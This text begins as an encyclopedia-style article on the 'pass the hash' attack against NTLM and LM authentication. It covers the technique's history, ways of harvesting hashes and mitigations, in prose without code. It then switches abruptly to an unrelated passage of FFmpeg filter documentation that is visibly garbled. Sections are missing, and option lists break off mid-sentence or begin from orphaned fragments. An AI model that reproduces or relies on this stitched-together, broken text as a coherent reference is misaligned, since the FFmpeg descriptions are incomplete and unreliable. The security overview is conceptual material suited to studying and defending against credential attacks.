Hacking technique

In [computer security](/wiki/Computer_security "Computer security"), **pass the hash** is a hacking technique that allows an attacker to authenticate to a remote server or service by using the underlying [NTLM](/wiki/NTLM "NTLM") or [LanMan](/wiki/LM_hash "LM hash") [hash](/wiki/Cryptographic_hash_function "Cryptographic hash function") of a user's password, instead of requiring the associated [plaintext](/wiki/Plaintext "Plaintext") password as is normally the case. It replaces the need for stealing the plaintext password to gain access with stealing the hash.

The attack exploits an implementation weakness in the authentication protocol, where password hashes remain static from [session](/wiki/Login_session "Login session") to session until the password is next changed.

This technique can be performed against any server or service accepting LM or NTLM authentication, whether it runs on a machine with Windows, Unix, or any other operating system.

## Description

[[edit](/w/index.php?title=Pass_the_hash&action=edit&section=1 "Edit section: Description")]

On systems or services using NTLM authentication, users' passwords are never sent in [cleartext](/wiki/Plaintext "Plaintext") over the wire. Instead, they are provided to the requesting system, like a [domain controller](/wiki/Domain_controller "Domain controller"), as a [hash](/wiki/Hash_function "Hash function") in a response to a [challenge–response authentication](/wiki/Challenge%E2%80%93response_authentication "Challenge–response authentication") scheme.[[1]](#cite_note-Hummel-1)

Native Windows applications ask users for the cleartext password, then call [APIs](/wiki/Application_programming_interface "Application programming interface") like LsaLogonUser[[2]](#cite_note-2) that convert that password to one or two hash values (the LM or NT hashes) and then send that to the remote server during NTLM authentication.[[Notes 1]](#cite_note-3)[[3]](#cite_note-4)

If an attacker has the hashes of a user's password, they do not need the cleartext password; they can simply use the hash to authenticate with a server and impersonate that user.[[4]](#cite_note-n580-5)[[5]](#cite_note-s220-6)[[6]](#cite_note-Compass-7)[*[permanent dead link](/wiki/Wikipedia%3ALink_rot "Wikipedia:Link rot")*‍] In other words, from an attacker's perspective, hashes are functionally equivalent to the original passwords that they were generated from.

## History

[[edit](/w/index.php?title=Pass_the_hash&action=edit&section=2 "Edit section: History")]

The *pass the hash* technique was originally published by Paul Ashton in 1997[[6]](#cite_note-Compass-7) and consisted of a modified [Samba](/wiki/Samba_%28software%29 "Samba (software)") [SMB](/wiki/Server_Message_Block "Server Message Block") client that accepted user password hashes instead of cleartext passwords. Later versions of Samba and other third-party implementations of the SMB and NTLM protocols also included the functionality.

This implementation of the technique was based on an SMB stack created by a third-party (e.g., Samba and others), and for this reason suffered from a series of limitations from a hacker's perspective, including limited or partial functionality: The SMB protocol has continued to evolve over the years, this means that third parties creating their own implementation of the SMB protocol need to implement changes and additions to the protocol after they are introduced by newer versions of Windows and SMB (historically by reverse engineering, which is very complex and time-consuming). This means that even after performing NTLM authentication successfully using the *pass the hash* technique, tools like Samba's SMB client might not have implemented the functionality the attacker might want to use. This meant that it was difficult to attack Windows programs that use DCOM or RPC.

Also, because attackers were restricted to using third-party clients when carrying out attacks, it was not possible to use built-in Windows applications, like Net.exe or the *Active Directory Users and Computers* tool amongst others, because they asked the attacker or user to enter the cleartext password to authenticate, and not the corresponding password hash value.

In 2008, Hernan Ochoa published a tool called the "Pass-the-Hash Toolkit"[[7]](#cite_note-8) that allowed 'pass the hash' to be performed natively on Windows. It allowed the user name, domain name, and password hashes cached in memory by the [Local Security Authority](/wiki/Local_Security_Authority "Local Security Authority") to be changed at runtime *after* a user was authenticated — this made it possible to 'pass the hash' using standard Windows applications, and thereby to undermine fundamental authentication mechanisms built into the operating system.

The tool also introduced a new technique which allowed dumping password hashes cached in the memory of the [lsass.exe](/wiki/Local_Security_Authority_Subsystem_Service "Local Security Authority Subsystem Service") process (not in persistent storage on disk), which quickly became widely used by [penetration testers](/wiki/Penetration_test "Penetration test") (and attackers). This hash harvesting technique is more advanced than previously used techniques (e.g. dumping the local [Security Accounts Manager](/wiki/Security_Accounts_Manager "Security Accounts Manager") database (SAM) using *[pwdump](/wiki/Pwdump "Pwdump")* and similar tools), mainly because hash values stored in memory could include credentials of domain users (and domain administrators) that logged into the machine. For example, the hashes of authenticated domain users that are not stored persistently in the local SAM can also be dumped. This makes it possible for a penetration tester (or attacker) to compromise a whole [Windows domain](/wiki/Windows_domain "Windows domain") after compromising a single machine that was a member of that domain. Furthermore, the attack can be implemented instantaneously and without any requirement for expensive computing resources to carry out a brute force attack.

This toolkit has subsequently been superseded by "Windows Credential Editor", which extends the original tool's functionality and operating system support.[[8]](#cite_note-9)[[9]](#cite_note-10) Some antivirus vendors classify the toolkit as malware.[[10]](#cite_note-11)[[11]](#cite_note-12)

## Hash harvesting

[[edit](/w/index.php?title=Pass_the_hash&action=edit&section=3 "Edit section: Hash harvesting")]

Before an attacker can carry out a pass-the-hash attack, they must obtain the password hashes of the target user accounts. To this end, penetration testers and attackers can harvest password hashes using a number of different methods:

* Cached hashes or credentials of users who have previously logged onto a machine (for example at the console or via RDP) can be read from the SAM by anyone who has Administrator-level privileges. The default behavior of caching hashes or credentials for offline use can be disabled by administrators, so this technique may not always work if a machine has been sufficiently hardened.
* Dumping the local user's account database ([SAM](/wiki/Security_Accounts_Manager "Security Accounts Manager")). This database only contains user accounts local to the particular machine that was compromised. For example, in a domain environment, the [SAM](/wiki/Security_Accounts_Manager "Security Accounts Manager") database of a machine will not contain domain users, only users local to that machine that more likely will not be very useful to authenticate to other services on the domain. However, if the same local administrative account passwords are used across multiple systems the attacker can remotely access those systems using the local user account hashes.
* [Sniffing](/wiki/Packet_analyzer "Packet analyzer") LM and NTLM challenge–response dialogues between client and servers, and later brute-forcing captured encrypted hashes (since the hashes obtained in this way are encrypted, it is necessary to perform a brute-force attack to obtain the actual hashes).
* Dumping authenticated users' credentials stored by Windows in the memory of the lsass.exe process. The credentials dumped in this way may include those of domain users or administrators, such as those logged in via [RDP](/wiki/Remote_Desktop_Protocol "Remote Desktop Protocol"). This technique may therefore be used to obtain credentials of user accounts that are not local to the compromised computer, but rather originate from the security domain that the machine is a member of.

## Mitigations

[[edit](/w/index.php?title=Pass_the_hash&action=edit&section=4 "Edit section: Mitigations")]

Any system using LM or NTLM authentication in combination with any communication protocol (SMB, FTP, RPC, HTTP etc.) is at risk from this attack.[[1]](#cite_note-Hummel-1) The exploit is very difficult to defend against, due to possible exploits in Windows and applications running on Windows that can be used by an attacker to [elevate](/wiki/Privilege_escalation "Privilege escalation") their privileges and then carry out the hash harvesting that facilitates the attack. Furthermore, it may only require one machine in a Windows domain to not be configured correctly or be missing a security patch for an attacker to find a way in. A wide range of penetration testing tools are furthermore available to automate the process of discovering a weakness on a machine.

There is no single defense against the technique, thus standard [defense in depth](/wiki/Defense_in_depth_%28computing%29 "Defense in depth (computing)") practices apply[[12]](#cite_note-Ewaida-13) – for example use of [firewalls](/wiki/Firewall_%28computing%29 "Firewall (computing)"), [intrusion prevention systems](/wiki/Intrusion_prevention_system "Intrusion prevention system"), [802.1x authentication](/wiki/IEEE_802.1X "IEEE 802.1X"), [IPsec](/wiki/IPsec "IPsec"), [antivirus software](/wiki/Antivirus_software "Antivirus software"), reducing the number of people with elevated privileges,[[13]](#cite_note-14) pro-active security patching[[14]](#cite_note-15) etc. Preventing Windows from storing cached credentials may limit attackers to obtaining hashes from memory, which usually means that the target account must be logged into the machine when the attack is executed.[[15]](#cite_note-16) Allowing domain administrators to log into systems that may be compromised or untrusted will create a scenario where the administrators' hashes become the targets of attackers; limiting domain administrator logons to trusted domain controllers can therefore limit the opportunities for an attacker.[[12]](#cite_note-Ewaida-13) The [principle of least privilege](/wiki/Principle_of_least_privilege "Principle of least privilege") suggests that a least user access (LUA) approach should be taken, in that users should not use accounts with more privileges than necessary to complete the task at hand.[[12]](#cite_note-Ewaida-13) Configuring systems not to use LM or NTLM can also strengthen security, but newer exploits are able to forward [Kerberos tickets](/wiki/Kerberos_ticket "Kerberos ticket") in a similar way.[[16]](#cite_note-17) Limiting the scope of [debug](/wiki/Debugger "Debugger") privileges on system may frustrate some attacks that [inject code](/wiki/Code_injection "Code injection") or steal hashes from the memory of sensitive processes.[[12]](#cite_note-Ewaida-13)

Restricted Admin Mode is a new Windows operating system feature introduced in 2014 via security bulletin 2871997, which is designed to reduce the effectiveness of the attack.[[17]](#cite_note-18)

## [1 Description](#toc-Description)

This document describes filters, sources, and sinks provided by the
libavfilter library.

## [2 Filtering Introduction](#toc-Filtering-Introduction)

Filtering in FFmpeg is enabled through the libavfilter library.

In libavfilter, a filter can have multiple inputs and multiple
outputs.
To illustrate the sorts of things that are possible, we consider the
following filtergraph.

```
                [main]
input --> split ---------------------> overlay --> output
            |                             ^
            |[tmp]                  [flip]|
            +-----> crop --> vflip -------+

```

This filtergraph splits the input stream in two streams, then sends one
stream through the crop filter and the vflip filter, before merging it
back with the other stream by overlaying it on top. You can use the
following command to achieve this:

```
ffmpeg -i INPUT -vf "split [main][tmp]; [tmp] crop=iw:ih/2:0:0, vflip [flip]; [main][flip] overlay=0:H/2" OUTPUT

```

The result will be that the top half of the video is mirrored
onto the bottom half of the output video.

Filters in the same linear chain are separated by commas, and distinct
linear chains of filters are separated by semicolons. In our example,
crop,vflip are in one linear chain, split and
overlay are separately in another. The points where the linear
chains join are labelled by names enclosed in square brackets. In the
example, the split filter generates two outputs that are associated to
the labels [main] and [tmp].

The stream sent to the second output of split, labelled as
[tmp], is processed through the crop filter, which crops
away the lower half part of the video, and then vertically flipped. The
overlay filter takes in input the first unchanged output of the
split filter (which was labelled as [main]), and overlay on its
lower half the output generated by the crop,vflip filterchain.

Some filters take in input a list of parameters: they are specified
after the filter name and an equal sign, and are separated from each other
by a colon.

There exist so-called source filters that do not have an
audio/video input, and sink filters that will not have audio/video
output.

## [3 graph2dot](#toc-graph2dot)

The `graph2dot` program included in the FFmpeg `tools`
directory can be used to parse a filtergraph description and issue a
corresponding textual representation in the dot language.

Invoke the command:

```
graph2dot -h

```

to see how to use `graph2dot`.

You can then pass the dot description to the `dot` program (from
the graphviz suite of programs) and obtain a graphical representation
of the filtergraph.

For example the sequence of commands:

```
echo GRAPH_DESCRIPTION | \
tools/graph2dot -o graph.tmp && \
dot -Tpng graph.tmp -o graph.png && \
display graph.png

```

can be used to create and display an image representing the graph
described by the GRAPH\_DESCRIPTION string. Note that this string must be
a complete self-contained graph, with its inputs and outputs explicitly defined.
For example if your command line is of the form:

```
ffmpeg -i infile -vf scale=640:360 outfile

```

your GRAPH\_DESCRIPTION string will need to be of the form:

```
nullsrc,scale=640:360,nullsink

```

you may also need to set the nullsrc parameters and add a format
filter in order to simulate a specific input file.

## [4 Filtergraph description](#toc-Filtergraph-description)

A filtergraph is a directed graph of connected filters. It can contain
cycles, and there can be multiple links between a pair of
filters. Each link has one input pad on one side connecting it to one
filter from which it takes its input, and one output pad on the other
side connecting it to one filter accepting its output.

Each filter in a filtergraph is an instance of a filter class
registered in the application, which defines the features and the
number of input and output pads of the filter.

A filter with no input pads is called a "source", and a filter with no
output pads is called a "sink".

### [4.1 Filtergraph syntax](#toc-Filtergraph-syntax-1)

A filtergraph has a textual representation, which is recognized by the
`-filter`/`-vf`/`-af` and
`-filter_complex` options in `ffmpeg` and
`-vf`/`-af` in `ffplay`, and by the
`avfilter_graph_parse_ptr()` function defined in
`libavfilter/avfilter.h`.

A filterchain consists of a sequence of connected filters, each one
connected to the previous one in the sequence. A filterchain is
represented by a list of ","-separated filter descriptions.

A filtergraph consists of a sequence of filterchains. A sequence of
filterchains is represented by a list of ";"-separated filterchain
descriptions.

A filter is represented by a string of the form:
[in\_link\_1]...[in\_link\_N]filter\_name@id=arguments[out\_link\_1]...[out\_link\_M]

filter\_name is the name of the filter class of which the
described filter is an instance of, and has to be the name of one of
the filter classes registered in the program optionally followed by "@id".
The name of the filter class is optionally followed by a string
"=arguments".

arguments is a string which contains the parameters used to
initialize the filter instance. It may have one of two forms:

* A ’:’-separated list of key=value pairs.
* A ’:’-separated list of value. In this case, the keys are assumed to be
  the option names in the order they are declared. E.g. the `fade` filter
  declares three options in this order – `type`, `start_frame` and
  `nb_frames`. Then the parameter list in:0:30 means that the value
  in is assigned to the option `type`, 0 to
  `start_frame` and 30 to `nb_frames`.
* A ’:’-separated list of mixed direct value and long key=value
  pairs. The direct value must precede the key=value pairs, and
  follow the same constraints order of the previous point. The following
  key=value pairs can be set in any preferred order.

If the option value itself is a list of items (e.g. the `format` filter
takes a list of pixel formats), the items in the list are usually separated by
‘`|`’.

The list of arguments can be quoted using the character ‘`'`’ as initial
and ending mark, and the character ‘`\`’ for escaping the characters
within the quoted text; otherwise the argument string is considered
terminated when the next special character (belonging to the set
‘`[]=;,`’) is encountered.

A special syntax implemented in the `ffmpeg` CLI tool allows loading
option values from files. This is done be prepending a slash ’/’ to the option
name, then the supplied value is interpreted as a path from which the actual
value is loaded. E.g.

```
ffmpeg -i <INPUT> -vf drawtext=/text=/tmp/some_text <OUTPUT>

```

will load the text to be drawn from `/tmp/some_text`. API users wishing to
implement a similar feature should use the `avfilter_graph_segment_*()`
functions together with custom IO code.

The name and arguments of the filter are optionally preceded and
followed by a list of link labels.
A link label allows one to name a link and associate it to a filter output
or input pad. The preceding labels in\_link\_1
... in\_link\_N, are associated to the filter input pads,
the following labels out\_link\_1 ... out\_link\_M, are
associated to the output pads.

When two link labels with the same name are found in the
filtergraph, a link between the corresponding input and output pad is
created.

If an output pad is not labelled, it is linked by default to the first
unlabelled input pad of the next filter in the filterchain.
For example in the filterchain

```
nullsrc, split[L1], [L2]overlay, nullsink

```

the split filter instance has two output pads, and the overlay filter
instance two input pads. The first output pad of split is labelled
"L1", the first input pad of overlay is labelled "L2", and the second
output pad of split is linked to the second input pad of overlay,
which are both unlabelled.

In a filter description, if the input label of the first filter is not
specified, "in" is assumed; if the output label of the last filter is not
specified, "out" is assumed.

In a complete filterchain all the unlabelled filter input and output
pads must be connected. A filtergraph is considered valid if all the
filter input and output pads of all the filterchains are connected.

Leading and trailing whitespaces (space, tabs, or line feeds) separating tokens
in the filtergraph specification are ignored. This means that the filtergraph
can be expressed using empty lines and spaces to improve redability.

For example, the filtergraph:

```
testsrc,split[L1],hflip[L2];[L1][L2] hstack

```

can be represented as:

```
testsrc,
split [L1], hflip [L2];

[L1][L2] hstack

```

Libavfilter will automatically insert [scale](#scale) filters where format
conversion is required. It is possible to specify swscale flags
for those automatically inserted scalers by prepending
`sws_flags=flags;`
to the filtergraph description.

Here is a BNF description of the filtergraph syntax:

```
NAME             ::= sequence of alphanumeric characters and '_'
FILTER_NAME      ::= NAME["@"NAME]
LINKLABEL        ::= "[" NAME "]"
LINKLABELS       ::= LINKLABEL [LINKLABELS]
FILTER_ARGUMENTS ::= sequence of chars (possibly quoted)
FILTER           ::= [LINKLABELS] FILTER_NAME ["=" FILTER_ARGUMENTS] [LINKLABELS]
FILTERCHAIN      ::= FILTER [,FILTERCHAIN]
FILTERGRAPH      ::= [sws_flags=flags;] FILTERCHAIN [;FILTERGRAPH]

```

### [4.2 Notes on filtergraph escaping](#toc-Notes-on-filtergraph-escaping)

Filtergraph description composition entails several levels of
escaping. See [(ffmpeg-utils)the "Quoting and escaping"
section in the ffmpeg-utils(1) manual](ffmpeg-utils.html#quoting_005fand_005fescaping) for more
information about the employed escaping procedure.

A first level escaping affects the content of each filter option
value, which may contain the special character `:` used to
separate values, or one of the escaping characters `\'`.

A second level escaping affects the whole filter description, which
may contain the escaping characters `\'` or the special
characters `[],;` used by the filtergraph description.

Finally, when you specify a filtergraph on a shell commandline, you
need to perform a third level escaping for the shell special
characters contained within it.

For example, consider the following string to be embedded in
the [drawtext](#drawtext) filter description `text` value:

```
this is a 'string': may contain one, or more, special characters

```

This string contains the `'` special escaping character, and the
`:` special character, so it needs to be escaped in this way:

```
text=this is a \'string\'\: may contain one, or more, special characters

```

A second level of escaping is required when embedding the filter
description in a filtergraph description, in order to escape all the
filtergraph special characters. Thus the example above becomes:

```
drawtext=text=this is a \\\'string\\\'\\: may contain one\, or more\, special characters

```

(note that in addition to the `\'` escaping special characters,
also `,` needs to be escaped).

Finally an additional level of escaping is needed when writing the
filtergraph description in a shell command, which depends on the
escaping rules of the adopted shell. For example, assuming that
`\` is special and needs to be escaped with another `\`, the
previous string will finally result in:

```
-vf "drawtext=text=this is a \\\\\\'string\\\\\\'\\\\: may contain one\\, or more\\, special characters"

```

In order to avoid cumbersome escaping when using a commandline tool accepting a
filter specification as input, it is advisable to avoid direct inclusion of the
filter or options specification in the shell.

For example, in case of the [drawtext filter](#drawtext), you might prefer to
use the `textfile` option in place of `text` to specify the text
to render.

## [5 Timeline editing](#toc-Timeline-editing)

Some filters support a generic `enable` option. For the filters
supporting timeline editing, this option can be set to an expression which is
evaluated before sending a frame to the filter. If the evaluation is non-zero,
the filter will be enabled, otherwise the frame will be sent unchanged to the
next filter in the filtergraph.

The expression accepts the following values:

‘`t`’

timestamp expressed in seconds, NAN if the input timestamp is unknown

‘`n`’

sequential number of the input frame, starting from 0

‘`pos`’

the position in the file of the input frame, NAN if unknown; deprecated, do
not use

‘`w`’
‘`h`’

width and height of the input frame if video

Additionally, these filters support an `enable` command that can be used
to re-define the expression.

Like any other filtering option, the `enable` option follows the same
rules.

For example, to enable a blur filter ([smartblur](#smartblur)) from 10 seconds to 3
minutes, and a [curves](#curves) filter starting at 3 seconds:

```
smartblur = enable='between(t,10,3*60)',
curves    = enable='gte(t,3)' : preset=cross_process

```

See `ffmpeg -filters` to view which filters have timeline support.

## [6 Changing options at runtime with a command](#toc-Changing-options-at-runtime-with-a-command)

Some options can be changed during the operation of the filter using
a command. These options are marked ’T’ on the output of
`ffmpeg` `-h filter=<name of filter>`.
The name of the command is the name of the option and the argument is
the new value.

## [7 Options for filters with several inputs (framesync)](#toc-Options-for-filters-with-several-inputs-_0028framesync_0029)

Some filters with several inputs support a common set of options.
These options can only be set by name, not with the short notation.

`eof_action`

The action to take when EOF is encountered on the secondary input; it accepts
one of the following values:

`repeat`

Repeat the last frame (the default).

`endall`

End both streams.

`pass`

Pass the main input through.

`shortest`

If set to 1, force the output to terminate when the shortest input
terminates. Default value is 0.

`repeatlast`

If set to 1, force the filter to extend the last frame of secondary streams
until the end of the primary stream. A value of 0 disables this behavior.
Default value is 1.

`ts_sync_mode`

How strictly to sync streams based on secondary input timestamps; it accepts
one of the following values:

`default`

Frame from secondary input with the nearest lower or equal timestamp to the
primary input frame.

`nearest`

Frame from secondary input with the absolute nearest timestamp to the primary
input frame.

## [8 Audio Filters](#toc-Audio-Filters)

When you configure your FFmpeg build, you can disable any of the
existing filters using `--disable-filters`.
The configure output will show the audio filters included in your
build.

Below is a description of the currently available audio filters.

### [8.1 aap](#toc-aap)

Apply Affine Projection algorithm to the first audio stream using the second audio stream.

This adaptive filter is used to estimate unknown audio based on multiple input audio samples.
Affine projection algorithm can make trade-offs between computation complexity with convergence speed.

A description of the accepted options follows.

`order`

Set the filter order.

`projection`

Set the projection order.

`mu`

Set the filter mu.

`delta`

Set the coefficient to initialize internal covariance matrix.

`out_mode`

Set the filter output samples. It accepts the following values:

`i`

Pass the 1st input.

`d`

Pass the 2nd input.

`o`

Pass difference between desired, 2nd input and error signal estimate.

`n`

Pass difference between input, 1st input and error signal estimate.

`e`

Pass error signal estimated samples.

Default value is o.

`precision`

Set which precision to use when processing samples.

`auto`

Auto pick internal sample format depending on other filters.

`float`

Always use single-floating point precision sample format.

`double`

Always use double-floating point precision sample format.

### [8.2 acompressor](#toc-acompressor)

A compressor is mainly used to reduce the dynamic range of a signal.
Especially modern music is mostly compressed at a high ratio to
improve the overall loudness. It’s done to get the highest attention
of a listener, "fatten" the sound and bring more "power" to the track.
If a signal is compressed too much it may sound dull or "dead"
afterwards or it may start to "pump" (which could be a powerful effect
but can also destroy a track completely).
The right compression is the key to reach a professional sound and is
the high art of mixing and mastering. Because of its complex settings
it may take a long time to get the right feeling for this kind of effect.

Compression is done by detecting the volume above a chosen level
`threshold` and dividing it by the factor set with `ratio`.
So if you set the threshold to -12dB and your signal reaches -6dB a ratio
of 2:1 will result in a signal at -9dB. Because an exact manipulation of
the signal would cause distortion of the waveform the reduction can be
levelled over the time. This is done by setting "Attack" and "Release".
`attack` determines how long the signal has to rise above the threshold
before any reduction will occur and `release` sets the time the signal
has to fall below the threshold to reduce the reduction again. Shorter signals
than the chosen attack time will be left untouched.
The overall reduction of the signal can be made up afterwards with the
`makeup` setting. So compressing the peaks of a signal about 6dB and
raising the makeup to this level results in a signal twice as loud than the
source. To gain a softer entry in the compression the `knee` flattens the
hard edge at the threshold in the range of the chosen decibels.

The filter accepts the following options:

`level_in`

Set input gain. Default is 1. Range is between 0.015625 and 64.

`mode`

Set mode of compressor operation. Can be `upward` or `downward`.
Default is `downward`.

`threshold`

If a signal of stream rises above this level it will affect the gain
reduction.
By default it is 0.125. Range is between 0.00097563 and 1.

`ratio`

Set a ratio by which the signal is reduced. 1:2 means that if the level
rose 4dB above the threshold, it will be only 2dB above after the reduction.
Default is 2. Range is between 1 and 20.

`attack`

Amount of milliseconds the signal has to rise above the threshold before gain
reduction starts. Default is 20. Range is between 0.01 and 2000.

`release`

Amount of milliseconds the signal has to fall below the threshold before
reduction is decreased again. Default is 250. Range is between 0.01 and 9000.

`makeup`

Set the amount by how much signal will be amplified after processing.
Default is 1. Range is from 1 to 64.

`knee`

Curve the sharp knee around the threshold to enter gain reduction more softly.
Default is 2.82843. Range is between 1 and 8.

`link`

Choose if the `average` level between all channels of input stream
or the louder(`maximum`) channel of input stream affects the
reduction. Default is `average`.

`detection`

Should the exact signal be taken in case of `peak` or an RMS one in case
of `rms`. Default is `rms` which is mostly smoother.

`mix`

How much to use compressed signal in output. Default is 1.
Range is between 0 and 1.

#### [8.2.1 Commands](#toc-Commands)

This filter supports the all above options as [commands](#commands).

### [8.3 acontrast](#toc-acontrast)

Simple audio dynamic range compression/expansion filter.

The filter accepts the following options:

`contrast`

Set contrast. Default is 33. Allowed range is between 0 and 100.

### [8.4 acopy](#toc-acopy)

Copy the input audio source unchanged to the output. This is mainly useful for
testing purposes.

### [8.5 acrossfade](#toc-acrossfade)

Apply cross fade from one input audio stream to another input audio stream.

### [8.7 acrusher](#toc-acrusher)

Reduce audio bit resolution.

This filter is bit crusher with enhanced functionality. A bit crusher
is used to audibly reduce number of bits an audio signal is sampled
with. This doesn’t change the bit depth at all, it just produces the
effect. Material reduced in bit depth sounds more harsh and "digital".
This filter is able to even round to continuous values instead of discrete
bit depths.
Additionally it has a D/C offset which results in different crushing of
the lower and the upper half of the signal.
An Anti-Aliasing setting is able to produce "softer" crushing sounds.

Another feature of this filter is the logarithmic mode.
This setting switches from linear distances between bits to logarithmic ones.
The result is a much more "natural" sounding crusher which doesn’t gate low
signals for example. The human ear has a logarithmic perception,
so this kind of crushing is much more pleasant.
Logarithmic crushing is also able to get anti-aliased.

The filter accepts the following options:

`level_in`

Set level in.

`level_out`

Set level out.

`bits`

Set bit reduction.

`mix`

Set mixing amount.

`mode`

Can be linear: `lin` or logarithmic: `log`.

`aa`

Set anti-aliasing.

`samples`

Set sample reduction.

`lfo`

Enable LFO. By default disabled.

`lforange`

Set LFO range.

`lforate`

Set LFO rate.

Default value is `2`.
This controls the strength of impulsive noise which is going to be removed.
The lower value, the more samples will be detected as impulsive noise.

`burst, b`

Set burst fusion, in percentage of window size. Allowed range is `0` to
`10`. Default value is `2`.

`0` to `25`. Default value is `8` percent. This option also controls
quality of interpolated samples using neighbour good samples.

`threshold, t`

Set threshold value. Allowed range is from `1` to `100`.
Default value is `10`. Higher values make clip detection less aggressive.

`hsize, n`

Set size of histogram used to detect clips. Allowed range is from `100` to `9999`.
Default value is `1000`. Higher values make clip detection less aggressive.

`method, m`

If you want instead to delay in seconds, append ’s’ to number.

`all`

Use last set delay for all remaining channels. By default is disabled.
This option if enabled changes how option `delays` is interpreted.

#### [8.12.1 Examples](#toc-Examples-2)

* Delay first channel by 1.5 seconds, the third channel by 0.5 seconds and leave
  the second channel (and any other channels that may be present) unchanged.
  ```
  adelay=1500|0|500

  ```
* Delay second channel by 500 samples, the third channel by 700 samples and leave
  the first channel (and any other channels that may be present) unchanged.

#### [8.28.1 Commands](#toc-Commands-11)

This filter supports the all above options as [commands](#commands).

### [8.29 agate](#toc-agate)

A gate is mainly used to reduce lower parts of a signal. This kind of signal
processing reduces disturbing noise between useful signals.

Gating is done by detecting the volume below a chosen level threshold
and dividing it by the factor set with ratio. The bottom of the noise
floor is set via range. Because an exact manipulation of the signal
would cause distortion of the waveform the reduction can be levelled over
time. This is done by setting attack and release.

attack determines how long the signal has to fall below the threshold
before any reduction will occur and release sets the time the signal
has to rise above the threshold to reduce the reduction again.
Shorter signals than the chosen attack time will be left untouched.

`level_in`

Set input level before filtering.
Default is 1. Allowed range is from 0.015625 to 64.

`mode`

Set the mode of operation. Can be `upward` or `downward`.
Default is `downward`. If set to `upward` mode, higher parts of signal
will be amplified, expanding dynamic range in upward direction.
Otherwise, in case of `downward` lower parts of signal will be reduced.

`range`

Set the level of gain reduction when the signal is below the threshold.
Default is 0.06125. Allowed range is from 0 to 1.
Setting this to 0 disables reduction and then filter behaves like expander.

`threshold`

If a signal rises above this level the gain reduction is released.
Default is 0.125. Allowed range is from 0 to 1.

`ratio`

Set a ratio by which the signal is reduced.
Default is 2. Allowed range is from 1 to 9000.

`attack`

Amount of milliseconds the signal has to rise above the threshold before gain
reduction stops.
Default is 20 milliseconds. Allowed range is from 0.01 to 9000.

`release`

Amount of milliseconds the signal has to fall below the threshold before the
reduction is increased again. Default is 250 milliseconds.
Allowed range is from 0.01 to 9000.

`makeup`

Set amount of amplification of signal after processing.
Default is 1. Allowed range is from 1 to 64.

`knee`

Curve the sharp knee around the threshold to enter gain reduction more softly.
Default is 2.828427125. Allowed range is from 1 to 8.

`detection`

Choose if exact signal should be taken for detection or an RMS like one.
Default is `rms`. Can be `peak` or `rms`.

`link`

Choose if the average level between all channels or the louder channel affects
the reduction.
Default is `average`. Can be `average` or `maximum`.

### [8.31 alimiter](#toc-alimiter)

The limiter prevents an input signal from rising over a desired threshold.
This limiter uses lookahead technology to prevent your signal from distorting.
It means that there is a small delay after the signal is processed. Keep in mind

Default is 50 milliseconds.

`asc`

When gain reduction is always needed ASC takes care of releasing to an
average reduction level rather than reaching a reduction of 0 in the release
time.

`asc_level`

Select how much the release time is affected by ASC, 0 means nearly no changes
in release time while 1 produces higher release times.

`level`

Auto level output signal. Default is enabled.
This normalizes audio back to 0dB if enabled.

`latency`

Compensate the delay introduced by using the lookahead buffer set with attack
parameter. Also flush the valid audio data in the lookahead buffer when the
stream hits EOF.

Depending on picked setting it is recommended to upsample input 2x or 4x times
with [aresample](#aresample) before applying this filter.

### [8.32 allpass](#toc-allpass)

### [8.34 amerge](#toc-amerge-1)

Merge two or more audio streams into a single multi-channel stream.

The filter accepts the following options:

`inputs`

Set the number of inputs. Default is 2.

If the channel layouts of the inputs are disjoint, and therefore compatible,
the channel layout of the output will be set accordingly and the channels
will be reordered as necessary. If the channel layouts of the inputs are not
disjoint, the output will have all the channels of the first input then all
the channels of the second input, in that order, and the channel layout of
the output will be the default value corresponding to the total number of
channels.

For example, if the first input is in 2.1 (FL+FR+LF) and the second input
is FC+BL+BR, then the output will be in 5.1, with the channels in the
following order: a1, a2, b1, a3, b2, b3 (a1 is the first channel of the
first input, b1 is the first channel of the second input).

On the other hand, if both input are in stereo, the output channels will be
in the default order: a1, a2, b1, b2, and the channel layout will be
arbitrarily set to 4.0, which may or may not be the expected value.

All inputs must have the same sample rate, and format.

If inputs do not have the same duration, the output will stop with the
shortest.

#### [8.34.1 Examples](#toc-Examples-11)

* Merge two mono files into a stereo stream:
  ```
  amovie=left.wav [l] ; amovie=right.mp3 [r] ; [l] [r] amerge

  ```

### [8.35 amix](#toc-amix)

Mixes multiple audio inputs into a single output.

Note that this filter only supports float samples (the amerge
and pan audio filters support many formats). If the amix
input has integer samples then [aresample](#aresample) will be automatically
inserted to perform the conversion to float samples.

It accepts the following parameters:

`inputs`

The number of inputs. If unspecified, it defaults to 2.

`duration`

How to determine the end-of-stream.

by a space. If fewer weights are specified compared to number of inputs, the
last weight is assigned to the remaining inputs.
Default weight for each input is 1.

`normalize`

Always scale inputs instead of only doing summation of samples.
Beware of heavy clipping if inputs are not normalized prior or after filtering
by this filter if this option is disabled. By default is enabled.

#### [8.35.1 Examples](#toc-Examples-12)

* This will mix 3 input audio streams to a single output with the same duration as the
  first input and a dropout transition time of 3 seconds:
  ```
  ffmpeg -i INPUT1 -i INPUT2 -i INPUT3 -filter_complex amix=inputs=3:duration=first:dropout_transition=3 OUTPUT

  ```
* This will mix one vocal and one music input audio stream to a single output with the same duration as the
  longest input. The music will have quarter the weight as the vocals, and the inputs are not normalized:
  ```
  ffmpeg -i VOCALS -i MUSIC -filter_complex amix=inputs=2:duration=longest:dropout_transition=0:weights="1 0.25":normalize=0 OUTPUT

  ```

#### [8.35.2 Commands](#toc-Commands-14)

`weights`
`normalize`

Syntax is same as option with same name.

### [8.36 amultiply](#toc-amultiply)

in video stream.

`size`

Set video stream size. Only useful if curves option is activated.

`mgain`

Set max gain that will be displayed. Only useful if curves option is activated.
Setting this to a reasonable value makes it possible to display gain which is derived from
neighbour bands which are too close to each other and thus produce higher gain
when both are activated.

`fscale`

Set frequency scale used to draw frequency response in video output.
Can be linear or logarithmic. Default is logarithmic.

`colors`

Set color for each channel curve which is going to be displayed in video stream.

### [8.41 apad](#toc-apad)

Pad the end of an audio stream with silence.

This can be used together with `ffmpeg` `-shortest` to
extend audio streams to the same length as the video stream.

A description of the accepted options follows.

`packet_size`

Set silence packet size. Default value is 4096.

`pad_len`

Set the number of samples of silence to add to the end. After the
value is reached, the stream is terminated. This option is mutually
exclusive with `whole_len`.

`whole_len`

Set the minimum total number of samples in the output audio stream. If
the value is longer than the input audio length, silence is added to
the end, until the value is reached. This option is mutually exclusive
with `pad_len`.

`pad_dur`

Specify the duration of samples of silence to add. See
